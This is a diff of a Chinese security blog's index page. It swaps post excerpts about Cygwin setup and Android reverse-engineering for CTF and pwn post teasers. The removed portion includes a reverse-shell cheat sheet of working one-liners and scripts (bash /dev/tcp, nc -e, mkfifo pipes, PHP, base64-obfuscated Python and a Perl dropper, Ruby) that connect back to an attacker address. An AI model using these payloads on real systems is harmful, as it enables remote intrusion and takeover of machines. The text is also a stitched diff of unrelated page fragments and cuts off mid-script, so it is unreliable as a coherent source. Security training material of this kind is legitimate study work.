-<h3 id="3-必要的安装环节"><a href="#3-必要的安装环节" class="headerlink" title="3. 必要的安装环节"></a>3. 必要的安装环节</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt-cyg install python2</div><div class="line">apt-cyg install python3</div><div class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</div><div class="line">python get-pip.py</div></pre></td></tr></table></figure>
-<p>上面环节安装了python以及pip，但是如何知道使用的pip是不是cygwin中的呢？</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ls /bin/ | grep &quot;pip&quot;  #查找/bin/中存在的pip指令，一般会有pip2、pip3</div><div class="line">which pip   # 查看pip使用的是哪个地址，有时候会使用windows环境下的pip</div></pre></td></tr></table></figure>
-<p>我的环境中只能使用pip2，使用pip时会直接调用windows下的pip指令，导致下载的内容没用放到cygwin中，也即下载之后根本不能用。</p>
-<h3 id="4-pip2下载pillow时遇到的问题"><a href="#4-pip2下载pillow时遇到的问题" class="headerlink" title="4. pip2下载pillow时遇到的问题"></a>4. pip2下载pillow时遇到的问题</h3><p>下载pillow时会提示如下的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can&apos;t find lcms2.pc in any of /usr/local/lib/pkgconfig /usr/local/share/pkgconfig /usr/lib/pkgconfig /usr/share/pkgconfig use the PKG_CONFIG_PATH environment variable, or specify extra search paths via &apos;search_paths&apos;</div></pre></td></tr></table></figure>
-<p>总共有以下的文件没被找到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lcms2.pc</div><div class="line">libtiff-5.pc</div><div class="line">libtiff-4.pc</div><div class="line">freetype2.pc</div><div class="line">libimagequant.pc</div><div class="line">libjpeg.pc</div><div class="line">libopenjp2.pc</div><div class="line">zlib.pc</div><div class="line">Python.h</div></pre></td></tr></table></figure>
-<p>这时使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">apt-cyg install libglib2.0-devel</div><div class="line">apt-cyg install liblcms2-devel</div><div class="line">apt-cyg install libtiff-devel</div><div class="line">apt-cyg install libjpeg-devel</div><div class="line">apt-cyg install libimagequant-devel</div><div class="line">apt-cyg install libopenjp2-devel</div><div class="line">apt-cyg install python2-devel</div></pre></td></tr></table></figure>
-<p>之后仍未找到Python.h，这是因为全局变量PATH没有修正：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find / -name &quot;Python.h&quot;  # 找到Python.h对应的位置</div><div class="line">PATH=$PATH:Python.h所在文件夹</div></pre></td></tr></table></figure>
-<p>最后发现是gcc使用的window中的gcc，而不是cygwin中的gcc（其实没装）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-cyg install gcc-core</div><div class="line">apt-cyg install gcc-g++</div></pre></td></tr></table></figure>
-
-          
+          From https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/
+1. Challenge descriptionnc 47.75.182.113 9999
+2. Challenge resolution2.1 Introducin
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/20/pwn/blind-attack-HITB-XCTF-Quals-2018-babypwn/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1171,7 +779,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/08/android/android逆向准备工作/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/10/pwn/shell之后的操作/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -1190,7 +798,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/02/08/android/android逆向准备工作/" itemprop="url">android逆向准备工作</a></h2>
+                <a class="post-title-link" href="/2018/04/10/pwn/shell之后的操作/" itemprop="url">shell之后的操作</a></h2>
         
 
         <div class="post-meta">
@@ -1202,8 +810,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-08T15:59:12+08:00">
-                2018-02-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-10T00:00:26+08:00">
+                2018-04-10
               </time>
             
 
@@ -1225,8 +833,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/android/" itemprop="url" rel="index">
-                    <span itemprop="name">android</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -1264,41 +872,18 @@
       
         
           
-            <h3 id="0、笔者自述"><a href="#0、笔者自述" class="headerlink" title="0、笔者自述"></a>0、笔者自述</h3><p>说实话，对于Android逆向，我还只处在开始调试开发的阶段，但是实在是受不了Android中的流氓软件以及流氓事件，我打算进行简单的安卓逆向。刚开始的目标是去除app中的广告页（现在发现十分困难）！</p>
-<h3 id="1、安卓逆向的环境安装"><a href="#1、安卓逆向的环境安装" class="headerlink" title="1、安卓逆向的环境安装"></a>1、安卓逆向的环境安装</h3><h4 id="1-1-jdk安装"><a href="#1-1-jdk安装" class="headerlink" title="1.1 jdk安装"></a>1.1 jdk安装</h4><p>jdk安装实在指导很多，但是这儿还是得提醒一句，是jdk的安装，不是jre！</p>
-<p>参考：<a href="https://jingyan.baidu.com/article/0202781175839b1bcc9ce529.html" target="_blank" rel="external">https://jingyan.baidu.com/article/0202781175839b1bcc9ce529.html</a></p>
-<h4 id="1-2-Android-Studio安装"><a href="#1-2-Android-Studio安装" class="headerlink" title="1.2 Android Studio安装"></a>1.2 Android Studio安装</h4><p>貌似现在很多的书籍和网上的提示都是建议用ADT，也即安装Eclipse之后再安装ADT bundle（包含SDK），这中间配置极其麻烦，并且网上很多指导建议都已经过时，毕竟Google已经取消对ADT的支持，只推荐使用Android Studio。如果你们还不死心，那你除了安装上述内容外，还需要安装原生开发包（NDK）。</p>
-<p>但是如果你安装Android Studio，这些内容都可以快速配置完毕！其包含SDK_Manager、AVD_Manager等工具。</p>
-<h4 id="1-3-模拟器的使用"><a href="#1-3-模拟器的使用" class="headerlink" title="1.3 模拟器的使用"></a>1.3 模拟器的使用</h4><p>其实我很早就使用Android Studio了，在对比了1.0和现在的3.0版本之后，我发现Android Studio最大的改进就是加快了模拟器的启动速度。这应该会让许许多多的开发者爱上原生态的开发编辑器。现在使用的模拟器最大的问题在于，“窗口标题栏”不见了，没法进行拖拽，没法直接关闭，我真的要疯了！</p>
-<p>所以我在网上搜了好多，最后决定使用Genymotion和夜神模拟器！</p>
-<h5 id="1-3-1-Genymotion的安装与配置"><a href="#1-3-1-Genymotion的安装与配置" class="headerlink" title="1.3.1 Genymotion的安装与配置"></a>1.3.1 Genymotion的安装与配置</h5><p>Genymotion支持多种版本的手机，所以比较适用于开发。但是，它并不值得夸奖。</p>
-<p>不知道你们在安装Genymotion的时候，是否会出现登录错误、下载贼慢等稀奇古怪的问题，这些问题曾耽搁了我半天的时间。当然，最让人头疼的问题是：</p>
-<p><strong>问题a：</strong>Genymotion基于Virtualbox平台，但是从Genymotion中启动模拟器时出现了&quot;Unable to start the Virtual Device...&quot;错误，最后我锁定的问题是virtualbox版本不太稳定，换了一个，重启了电脑；</p>
-<p><strong>问题b：</strong>我成功的启动了Genymotion中的模拟器，但是我随便拖个应用进去都安装不上，提示“An error occured while deploying the file. This probably means that the app contains ARM native code and your Genymotion device cannot run ARM instructions. You should either build your native code to x86 or install an ARM translation tool in your device. ”错误，其实这是因为没有<a href="/others/files/Genymotion-ARM-Translation.zip">Genymotion-ARM-Translation.zip</a> 。这就需要我们打开模拟器，将此zip文件拖入模拟器中，一直点击yes，最后就可用了。</p>
-<p><strong>问题c：</strong> 虽然有些应用已经可以在Genymotion的模拟器中运行了，但是还是有不少应用运行不了，如微信、知乎等。网上有说换个低版本sdk的模拟器就可以，实测了几个，还是会有这类问题。比较玄学，没法做答！</p>
-<p><strong>问题d：</strong>既然我们使用的是Android Studio进行开发，那我们如何让其发现这个模拟器呢？首先在Android Studio-&gt;File-&gt;Settings-&gt;Plugins中找到genymotion插件，安装之后并重启。然后点击Android Studio-&gt;View-&gt;ToolBar，你会在工具栏中看到一个红色的Genymotion管理工具图标，现在基本上没问题了。</p>
-<p><strong>问题e：</strong>如何在Genymotion模拟器中运行工程？只需要点击绿色的run图标，并在Edit Configuration中选定Target为&quot;Open Select Deployment Target Dialog&quot;，接着点击run，选择genymotion中的模拟器（此模拟器在运行工程之前就已打开）。</p>
-<p>你可以看到，genymotion的配置与安装问题多多，而且解决的还不全面，基本上每次配置都要花费一两个小时，有点得不偿失，所以我十分建议使用夜神模拟器。</p>
-<h5 id="1-3-2-夜神模拟器的安装与配置"><a href="#1-3-2-夜神模拟器的安装与配置" class="headerlink" title="1.3.2 夜神模拟器的安装与配置"></a>1.3.2 夜神模拟器的安装与配置</h5><p>夜神模拟器安装基本上没有问题，所以这儿只讲配置问题。</p>
-<p>（1）运行夜神模拟器，</p>
-<p>（2）打开命令行窗口，</p>
-<p>（3）打开到夜神安装目录（如cd D:\Program Files (x86)\NOX\Nox\bin），</p>
-<p>（4）执行命令：nox_adb.exe connect 127.0.0.1:62001，连接模拟器，</p>
-<p>（5）若Android Studio连接不上夜神，重启模拟器即可。</p>
-<p>这五步就能让Android Studio连上夜神模拟器，而且运行速度很快。</p>
-<p>但是我们发现，貌似没法用android-sdk\platform-tool\adb devices发现这个模拟器，这就给测试造成了一定困难。由于版本不同，目前运行服务器端的adb（夜神）版本，比客户端的版本（SDK）低，所以系统就把当前运行的服务给杀掉了。</p>
-<p><strong>解决方案：</strong></p>
-<ul>
-<li>1、关掉AS和夜神模拟器。同时去任务管理器里看下，adb.exe以及nox_adb.exe这2个进程有没有在运行？有的话就结束掉。</li>
-<li>2、找到SDK的目录和夜神模拟器的目录，将SDK目录下的adb.exe文件，复制到夜神模拟器的目录下，因为夜神模拟器目录下原本的adb文件名字叫做nox_adb.exe，因此复制过去之后也得改名为nox_adb.exe。</li>
-<li>3、这样就将AS目录下的adb文件和模拟器目录下的adb文件完全同步了，版本号也一致了。</li>
-</ul>
-<h3 id="2、入门级操作"><a href="#2、入门级操作" class="headerlink" title="2、入门级操作"></a>2、入门级操作</h3><h4 id="2-1-AVD操作"><a href="#2-1-AVD操作" class="headerlink" title="2.1 AVD操作"></a>2.1 AVD操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#可使用的系统镜像列表</div><div class="line">android-sdk/tools/android list targets</div><div class="line"></div><div class="line">#创建AVD</div><div class="line">android-sdk/tools/android create avd -n [name of your new avd]</div><div class="line">android-sdk/tools/android create avd -n [avd设备名] -t [镜像id] -c [大小][K|M]</div><div class="line"></div><div class="line">#运行AVD</div><div class="line">android-sdk/tools/emulator -avd [avd的名字]</div><div class="line">android-sdk/tools/emulator -avd [avd的名字] -partition-size [size in MBs]</div></pre></td></tr></table></figure>
-<h4 id="2-2-ADB调试"><a href="#2-2-ADB调试" class="headerlink" title="2.2 ADB调试"></a>2.2 ADB调试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#运行AVD</div><div class="line">android-sdk/tools/emulator -avd [avd的名字]</div><div class="line"></div><div class="line">####使用Android连接桥(ADB)与AVD交互####</div><div class="line">#获取所有连接的android设备</div><div class="line">android-sdk/platform-tools/adb devices</div><div class="line"></div><div class="line"># 连接到android设备</div><div class="line">android-sdk/platform-tools/adb shell （当只有一个设备时）</div><div class="line">android-sdk/platform-tools/adb shell -s [指定设备] (当有多个设备时)</div><div class="line">此时，我们进入了android设备的后台，可以用常用的linux操作进行</div></pre></td></tr></table></figure>
-<h4 id="2-3-从AVD中复制出-入文件"><a href="#2-3-从AVD中复制出-入文件" class="headerlink" title="2.3 从AVD中复制出/入文件"></a>2.3 从AVD中复制出/入文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#从avd中复制出文件</div><div class="line">android-sdk/platform-tools/adb &#123;参数&#125; pull [要复制的文件路径] [存放复制出来的文件的本地路径]</div><div class="line"></div><div class="line">#把文件拷贝至avd中</div><div class="line">android-sdk/platform-tools/adb &#123;参数&#125; push [要复制的文件在本地的路径] [该文件在avd中的存放路径]</div></pre></td></tr></table></figure>
-<h4 id="2-4-通过ADB在AVD中安装app"><a href="#2-4-通过ADB在AVD中安装app" class="headerlink" title="2.4 通过ADB在AVD中安装app"></a>2.4 通过ADB在AVD中安装app</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 安装计算机中的apk</div><div class="line">adb &#123;参数&#125; install [apk的存放路径]</div><div class="line"></div><div class="line"># 使用指定设备的命令，缩小要安装APK的设备范围</div><div class="line">adb &#123; -e | -d | -p &#125; install [apk的存放路径]</div></pre></td></tr></table></figure>
-
-          
+          0x00 前言一般拿到shell之后能干什么？当然是反弹shell，然后进行一波扫操作了！但是你做题的时候，是否会遇到没有反弹shell的指令或者shell本身时长有限制，连上一会就断了！
+0x01 shell首先还是得讲反弹shell和正向连接shell
+前面的这篇文章有了很好的讲解
+0x02 延
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/10/pwn/shell之后的操作/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1345,7 +930,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/web/反弹Shell/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/08/pwn/IDA使用指南/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -1364,7 +949,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/12/09/web/反弹Shell/" itemprop="url">反弹Shell</a></h2>
+                <a class="post-title-link" href="/2018/04/08/pwn/IDA使用指南/" itemprop="url">IDA使用指南</a></h2>
         
 
         <div class="post-meta">
@@ -1376,8 +961,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T23:53:55+08:00">
-                2017-12-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-08T17:17:36+08:00">
+                2018-04-08
               </time>
             
 
@@ -1399,8 +984,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -1438,768 +1023,20 @@
       
         
           
-            <p>假设攻击端为10.0.0.1，接收端口为8080</p>
-<p>服务器端为10.0.0.2</p>
-<h3 id="1、Bash"><a href="#1、Bash" class="headerlink" title="1、Bash"></a>1、Bash</h3><p>关于bash中的重定向知识，可以参考<a href="/2018/04/10/shell之后的操作/">shell之后的操作</a></p>
-<p>服务器端：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &apos;sh -i &amp;&gt;/dev/tcp/10.0.0.1/8080 0&gt;&amp;1&apos;</div></pre></td></tr></table></figure>
-<p>攻击端：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 8080</div></pre></td></tr></table></figure>
-<h3 id="2、NetCat"><a href="#2、NetCat" class="headerlink" title="2、NetCat"></a>2、NetCat</h3><p>服务器端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 8080</div><div class="line">nc -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
-<p>现在的很多/bin/nc -&gt; /etc/alternatives/nc -&gt; /bin/nc.openbsd</p>
-<p>但是实际上这个nc.openbsd不支持nc -e命令</p>
-<p>所以我们最好使用的是/bin/nc.traditional</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/nc.traditional -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
-<p>当然若没有/bin/nc.traditional这个nc传统版，我们也可以使用下面的方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 8080 &gt;/tmp/f</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地监听两个端口,通过管道,一处输入,一处输出</div><div class="line">nc 10.0.0.1 2333|/bin/sh|nc 10.0.0.1 2444</div></pre></td></tr></table></figure>
-<p><img src="/images/2017-12-10/43-300x71.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 10.0.0.1 8080 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">将nc替换成telnet</div><div class="line">mknod backpipe p &amp;&amp; telnet 10.0.0.1 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
-<h3 id="3、PHP"><a href="#3、PHP" class="headerlink" title="3、PHP"></a>3、PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure>
-<p>不知道怎么回事，这个反弹的shell并不能用。代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6。当然推荐使用下面的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;set_time_limit(0);$a=&quot;1.0&quot;;$b=&quot;10.0.0.1&quot;;$c=8080;$d=1400;$e=null;$f=null;$g=&quot;uname -a; w; id; /bin/sh -i&quot;;$h=0;$i=0;if(function_exists(&quot;pcntl_fork&quot;))&#123;$j=pcntl_fork();if($j==-1)&#123;printit(&quot;ERROR: Can not fork&quot;);exit(1);&#125;if($j)&#123;exit(0);&#125;if(posix_setsid()==-1)&#123;printit(&quot;Error: Can not setsid()&quot;);exit(1);&#125;$h=1;&#125;else&#123;printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$k=fsockopen($b,$c,$l,$m,30);if(!$k)&#123;printit(&quot;$m ($l)&quot;);exit(1);&#125;$n=array(0=&gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&gt;array(&quot;pipe&quot;,&quot;w&quot;));$o=proc_open($g,$n,$p);if(!is_resource($o))&#123;printit(&quot;ERROR: Can not spawn shell&quot;);exit(1);&#125;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($k,0);printit(&quot;Successfully opened reverse shell to $b:$c&quot;);while(1)&#123;if(feof($k))&#123;printit(&quot;ERROR: Shell connection terminated&quot;);break;&#125;if(feof($p[1]))&#123;printit(&quot;ERROR: Shell process terminated&quot;);break;&#125;$q=array($k,$p[1],$p[2]);$r=stream_select($q,$e,$f,null);if(in_array($k,$q))&#123;if($i)printit(&quot;SOCK READ&quot;);$s=fread($k,$d);if($i)printit(&quot;SOCK: $s&quot;);fwrite($p[0],$s);&#125;if(in_array($p[1],$q))&#123;if($i)printit(&quot;STDOUT READ&quot;);$s=fread($p[1],$d);if($i)printit(&quot;STDOUT: $s&quot;);fwrite($k,$s);&#125;if(in_array($p[2],$q))&#123;if($i)printit(&quot;STDERR READ&quot;);$s=fread($p[2],$d);if($i)printit(&quot;STDERR: $s&quot;);fwrite($k,$s);&#125;&#125;fclose($k);fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($o);function printit($t)&#123;if(!$h)&#123;print&quot;$t\n&quot;;&#125;&#125;&apos;</div></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;function which($a)&#123;$b=execute(&quot;which $a&quot;);return($b?$b:$a);&#125;function execute($c)&#123;$d=&quot;&quot;;if($c)&#123;if(function_exists(&quot;exec&quot;))&#123;@exec($c,$d);$d=join(&quot;\n&quot;,$d);&#125;elseif(function_exists(&quot;shell_exec&quot;))&#123;$d=@shell_exec($c);&#125;elseif(function_exists(&quot;system&quot;))&#123;@ob_start();@system($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(function_exists(&quot;passthru&quot;))&#123;@ob_start();@passthru($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(@is_resource($e=@popen($c,&quot;r&quot;)))&#123;$d=&quot;&quot;;while(!@feof($e))&#123;$d.=@fread($e,1024);&#125;@pclose($e);&#125;&#125;return $d;&#125;function cf($g,$h)&#123;if($i=@fopen($g,&quot;w&quot;))&#123;@fputs($i,@base64_decode($h));@fclose($i);&#125;&#125;$j=&quot;10.0.0.1&quot;;$k=&quot;8080&quot;;$l=array(&quot;perl&quot;=&gt;&quot;perl&quot;,&quot;c&quot;=&gt;&quot;c&quot;);$m=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;cf(&quot;/tmp/.bc&quot;,$m);$d=execute(which(&quot;perl&quot;).&quot; /tmp/.bc $j $k &amp;&quot;);&apos;</div></pre></td></tr></table></figure>
-<h3 id="4、Python"><a href="#4、Python" class="headerlink" title="4、Python"></a>4、Python</h3><p>以python2.7为例</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s =socket.socket();s.connect((&apos;10.0.0.1&apos;,8080))\nwhile 1: proc =subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">若将</div><div class="line">import socket,subprocess,os</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.connect((&quot;10.0.0.1&quot;,8080))</div><div class="line">os.dup2(s.fileno(),0)</div><div class="line">os.dup2(s.fileno(),1)</div><div class="line">os.dup2(s.fileno(),2)</div><div class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</div><div class="line">base64加密后生成另外的shell</div><div class="line"></div><div class="line">python -c &apos;import base64;exec(base64.b64decode(&quot;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTAuMC4wLjEnLDgwODApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KDQwOTYpCndoaWxlIGxlbihkKSE9bDoKCWQrPXMucmVjdig0MDk2KQpleGVjKGQseydzJzpzfSkK&quot;))&apos;</div></pre></td></tr></table></figure>
-<h3 id="5、Ruby"><a href="#5、Ruby" class="headerlink" title="5、Ruby"></a>5、Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure>
-<p>不依赖于/bin/sh的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
-<p>windows环境下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
-<p>MSF中的相应的反弹shell代码</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'open3'</span></div><div class="line"></div><div class="line"><span class="comment">#Set the Remote Host IP</span></div><div class="line">RHOST = <span class="string">"192.168.1.10"</span> </div><div class="line"><span 